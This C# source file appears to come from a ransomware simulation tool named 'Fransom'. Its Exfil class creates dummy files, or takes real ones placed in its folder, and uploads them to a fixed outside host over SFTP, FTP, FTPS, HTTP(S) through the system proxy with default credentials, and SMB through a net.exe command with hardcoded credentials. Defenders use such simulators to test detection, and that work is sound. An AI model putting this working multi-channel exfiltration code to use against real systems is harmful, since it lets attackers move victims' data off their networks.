using FluentFTP;
using Renci.SshNet;
using Renci.SshNet.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Fransom
{
    class Exfil
    {
        string folder = "Fransom_data_exfiltration";
        string user = "fransom";
        string pass = "Fr@ns0m123!";
        string exfilhost = "blackhole.fraktal.cloud"; // blackhole accepts and deletes anything you throw at it

        void AddFile(string location, int size)
        {
            byte[] data = new byte[size * 1024 * 1024];
            Random rng = new Random();
            rng.NextBytes(data);
            File.WriteAllBytes(location + "\\" + Path.GetRandomFileName(), data);
        }

        public Exfil()
        {
            // generate random exfil data if none exists; touching disk allows substituting in real data for testing
            if (!Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
            }

            if (!Directory.EnumerateFileSystemEntries(folder).Any())
            {
                Random rnd = new Random();
                int filecount = rnd.Next(50);
                for (int i = 0; i < filecount; i++)
                {
                    AddFile(folder, rnd.Next(10));
                }
            }
        }


        public void ExfilSFTP()
        {
            var connectionInfo = new ConnectionInfo(exfilhost,
                                        user,
                                        new PasswordAuthenticationMethod(user, pass));
            using (var client = new SftpClient(connectionInfo))
            {
                client.Connect();
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;

                foreach (FileSystemInfo info in infos)
                {
                    using (var fileStream = new FileStream(info.FullName, FileMode.Open))
                    {
                        client.UploadFile(fileStream, "/uploads/" + info.Name);
                        FileInfo f = new FileInfo(info.FullName);
                        d += f.Length / (1024 * 1024);
                        Console.WriteLine("[*] Exfiltrated " + info.Name + " using SFTP. Total exfil'd data: " + d + " megabytes");
                    }
                }
                Console.WriteLine("exit");
            }
        }
        public void ExfilFTP()
        {
            using ( var client = new FtpClient(exfilhost, "ftp", "fraktal@"))
            {
                client.Connect();
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;
                foreach (FileSystemInfo info in infos)
                {
                    client.UploadFile(info.FullName, "/uploads/" + info.Name);
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using FTP. Total exfil'd data: " + d + " megabytes");
                }
            }
        }
        public void ExfilFTPS()
        {
            using (var client = new FtpClient(exfilhost, user, pass))
            {
                client.AutoConnect(); // AutoConnect handles ftps
                Console.WriteLine("Connected!");
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;

                client.EncryptionMode = FtpEncryptionMode.Explicit;
                client.DataConnectionType = FtpDataConnectionType.PASV;
                foreach (FileSystemInfo info in infos)
                {
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    client.UploadFile(info.FullName, "/" + info.Name);

                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using FTPS. Total exfil'd data: " + d + " megabytes");
                }
            }
        }
        public void ExfilHTTP()
        {
            IWebProxy defaultWebProxy = WebRequest.GetSystemWebProxy();
            defaultWebProxy.Credentials = CredentialCache.DefaultCredentials;
            using (WebClient client = new WebClient())
            {
                client.Proxy = defaultWebProxy;
                client.UseDefaultCredentials = true;
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();

                long d = 0;
                foreach (FileSystemInfo info in infos)
                {
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using HTTP. Total exfil'd data: " + d + " megabytes");
                    client.UploadFile("http://" + exfilhost + "/blackhole", info.FullName);
                }
            }
        }

        public void ExfilHTTPS()
        {
            IWebProxy defaultWebProxy = WebRequest.GetSystemWebProxy();
            defaultWebProxy.Credentials = CredentialCache.DefaultCredentials;
            using (WebClient client = new WebClient())
            {
                client.Proxy = defaultWebProxy;
                client.UseDefaultCredentials = true;
                IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                long d = 0;
                foreach (FileSystemInfo info in infos)
                {
                    client.UploadFile("https://" + exfilhost + "/blackhole", info.FullName);
                    FileInfo f = new FileInfo(info.FullName);
                    d += f.Length / (1024 * 1024);
                    Console.WriteLine("[*] Exfiltrated " + info.Name + " using HTTPS. Total exfil'd data: " + d + " megabytes");
                }
            }

        }
        public void ExfilSMB()
        {
            // quick and dirty
            Console.WriteLine("[*] Authenticating towards SMB share");
            Process process = new Process();
            string output, err;
            try
            {
                process.StartInfo.FileName = "net.exe";
                process.StartInfo.Arguments = "use \\\\" + exfilhost + "\\uploads" + " /user:.\\" + user + " " + pass;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                err = process.StandardError.ReadToEnd();
                process.WaitForExit();
            } catch (Exception e)
            {
                Console.WriteLine("[X] SMB connection failed: " + e.Message);
                return;
            }

            Console.WriteLine("[*] Authentication success");

            IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
            long d = 0;
            foreach (FileSystemInfo info in infos)
            {
                FileInfo f = new FileInfo(info.FullName);
                d += f.Length / (1024 * 1024);

                File.Copy(info.FullName, "\\\\" + exfilhost + "\\uploads\\" + info.Name);
                Console.WriteLine("[*] Exfiltrated " + info.Name + " using SMB. Total exfil'd data: " + d + " megabytes");
            }

            Console.WriteLine("[*] Clearing SMB share credentials");
            process.StartInfo.Arguments = "use /delete \\\\" + exfilhost + "\\uploads";
            process.Start();
            output = process.StandardOutput.ReadToEnd();
            err = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        public void ExfilDNS()
        {
            // TODO
        }
        public void ExfilICMP()
        {
            // TODO
        }


    }
}
